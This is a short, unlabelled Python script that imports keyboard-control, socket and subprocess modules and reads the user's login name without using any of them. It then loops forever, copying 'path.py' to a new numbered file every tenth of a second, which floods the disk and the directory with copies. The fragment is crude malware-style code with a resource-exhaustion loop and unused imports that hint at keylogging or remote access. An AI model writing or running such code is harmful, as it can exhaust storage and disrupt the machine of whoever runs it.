import os
import socket
import subprocess
import random
import shutil
import pynput
import time
enter =pynput.keyboard.Key.enter
login =os.getlogin()
i =1
while True:
 time.sleep(0.1)
 i = i + 1
 shutil.copy("path.py" ,  str(i) +"path.py")